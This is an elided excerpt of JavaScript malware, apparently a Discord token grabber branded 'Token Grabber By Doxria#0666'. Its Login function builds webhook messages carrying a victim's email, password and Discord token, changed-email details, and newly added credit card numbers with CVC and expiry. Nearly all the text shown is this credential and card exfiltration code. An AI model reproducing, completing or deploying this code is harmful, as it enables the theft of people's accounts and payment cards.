...
function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Syzer"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Syzer"));
...
function Login(email, password, token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        ...
        var params = {
            ...
            content: "",
            avatar_url: "https://i.hizliresim.com/2ss5jlk.gif",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                        {
                            ...
                            "value": `EPosta: ${email} - Parola: ${password}`,
                            "inline": true
                        },
                        {
                            "name": "**Token**",
                    ...
                    "footer": {
                        "text": "Token Grabber By Doxria#0666・https://syzer.xyz"
                    }
                }
            ]
        }
            ...
            embeds: [
                {
                    ...
                    "fields": [
                        {
                            "name": "**EPosta Değişikliği**",
                            "value": `Yeni EPosta: ${newemail}\nParola: ${password}`,
                            "inline": true
                        },
                        {
                            "name": "**Diğer Bilgiler**",
            ...
            embeds: [
                {
                    ...
                    "fields": [
                        {
                            "name": "**CC Eklendi**",
                            "value": `CC: ${number}\nCVC: ${cvc}\nCC Tarihi: ${expir_month}/${expir_year}`,
                            "inline": true
                        },
                        {
                            "name": "**Diğer Bilgiler**",
